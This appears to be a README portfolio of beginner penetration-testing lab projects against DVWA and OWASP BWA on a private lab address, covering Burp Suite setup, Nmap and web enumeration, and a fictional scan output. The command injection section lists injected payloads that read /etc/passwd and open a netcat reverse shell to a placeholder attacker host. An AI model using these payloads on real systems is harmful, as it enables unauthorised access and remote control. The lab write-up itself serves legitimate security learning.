# 🔐 Selvakumar's Cybersecurity Projects Portfolio

![Status](https://img.shields.io/badge/Status-Active-brightgreen)
![Focus](https://img.shields.io/badge/Focus-Web%20Security%20%7C%20Pentesting-blue)
![Tools](https://img.shields.io/badge/Tools-Burp%20Suite%2C%20DVWA%2C%20Kali%20Linux%2C%20OWASP%20BWA%2C%20Nmap-orange)
![Language](https://img.shields.io/badge/Language-MD%2C%20PHP%2C%20Linux-yellow)

---

## 📂 CS Projects Collection

## 📑 Table of Contents
1. [Broken Authentication Security Lab Project](#1-broken-authentication-security-lab-project)
2. [Command Injection Project](#2-command-injection-project)
3. [Information Gathering & Web Enumeration Project](#3-information-gathering--web-enumeration-project)
4. [Burp Suite Web Application Testing Setup](#4-burp-suite-web-application-testing-setup)
5. [DVWA Local Setup Project](#5-dvwa-local-setup-project)
6. [Nmap Vulnerability Scanning Project](#6-nmap-vulnerability-scanning-project)
7. [Conclusion](#7-conclusion)

---

## 1. Broken Authentication Security Lab Project

### Executive Summary
Broken Authentication is one of the OWASP Top 10 vulnerabilities. It occurs when applications improperly implement login, session, or password reset mechanisms, allowing attackers to compromise accounts.  

In this lab, we tested an intentionally vulnerable OWASP web application at `192.168.29.186` using Burp Suite. The goal was to identify authentication flaws, demonstrate them safely in a lab, and provide security recommendations.

### Lab Setup
- **Target VM:** OWASP DVWA / BWA / Juice Shop at `192.168.29.186`  
- **Attacker VM:** Kali Linux with Burp Suite Community Edition  
- **Browser:** Firefox with Burp proxy (`127.0.0.1:8080`)  
- **Test Accounts:** victim:test123, attacker:hacker123  
- **Network:** Host-only adapter (`192.168.29.0/24`)  

---

## 2. Command Injection Project

### Lab Setup
- **OS:** Kali Linux (attacker), OWASP DVWA/BWA (victim)  
- **Target IP:** `192.168.29.186`  
- **Tools:** Burp Suite, Netcat, Browser, Terminal  

### Exploitation Steps
1. Accessed DVWA Command Injection module at `192.168.29.186`.  
2. Entered `127.0.0.1` (test).  
3. Injected: `127.0.0.1 && whoami`.  
4. Extracted sensitive file: `127.0.0.1 && cat /etc/passwd`.  
5. Reverse shell: `127.0.0.1 && nc -e /bin/bash attacker_ip 4444`.  

---

## 3. Information Gathering & Web Enumeration Project

### Objective
Perform information gathering & enumeration on **OWASP BWA at `192.168.29.186`**.

### Steps
- **Ping Target** → `ping 192.168.29.186`  
- **DNS Enumeration** → `nslookup 192.168.29.186`, `host 192.168.29.186`  
- **Nmap Scans** →  
  ```bash
  nmap -sS 192.168.29.186
  nmap -A 192.168.29.186
  nmap --script vuln 192.168.29.186
WhatWeb → whatweb http://192.168.29.186

Dirb → dirb http://192.168.29.186

Nikto → nikto -h http://192.168.29.186

4. Burp Suite Web Application Testing Setup
Objective
Set up Burp Suite on Kali Linux to intercept traffic from Firefox & test OWASP applications at 192.168.29.186.

Steps
Configured Firefox proxy → 127.0.0.1:8080

Installed Burp CA Certificate

Intercepted traffic from http://192.168.29.186 (vulnerable app)

5. DVWA Local Setup Project
Setup Steps
Installed Apache2, MariaDB, PHP, Git on Kali Linux.

Cloned DVWA from GitHub.

Configured config.inc.php with DB creds.

Accessed DVWA at:

cpp

http://192.168.29.186/DVWA
6. Nmap Vulnerability Scanning Project
Objective
Use Nmap to scan local host 192.168.29.186 for open ports, services, and vulnerabilities.

Workflow Diagram
mermaid

flowchart LR
    A[Ping Scan<br/>nmap -sn 192.168.29.186] --> B[Port Scan<br/>nmap -sS -p- 192.168.29.186]
    B --> C[Service/Version Detection<br/>nmap -sV 192.168.29.186]
    C --> D[OS Detection<br/>nmap -O 192.168.29.186]
    D --> E[Aggressive Scan<br/>nmap -A 192.168.29.186]
    E --> F[Vulnerability Scripts<br/>nmap --script vuln 192.168.29.186]
    F --> G[Analyze & Report]
Commands
bash

nmap -sn 192.168.29.186
nmap -sS -p- 192.168.29.186
nmap -sV 192.168.29.186
nmap -O 192.168.29.186
nmap -A 192.168.29.186
nmap --script vuln 192.168.29.186
Sample Output (Fictional)
pgsql

21/tcp open ftp  vsftpd 2.3.4
22/tcp open ssh  OpenSSH 7.2p2
80/tcp open http Apache 2.4.18
139/tcp open smb  Samba 3.X-4.X

| ftp-vsftpd-backdoor: Vulnerable version detected!
| http-dombased-xss: Potential DOM-based XSS vulnerability found.
| smb-vuln-ms17-010: VULNERABLE: EternalBlue
7. Conclusion
This portfolio demonstrates hands-on cybersecurity lab projects using the OWASP target at 192.168.29.186.

It includes:

Authentication flaws

Command injection

Reconnaissance & enumeration

Traffic interception with Burp

Vulnerable lab setup (DVWA)

Vulnerability scanning with Nmap
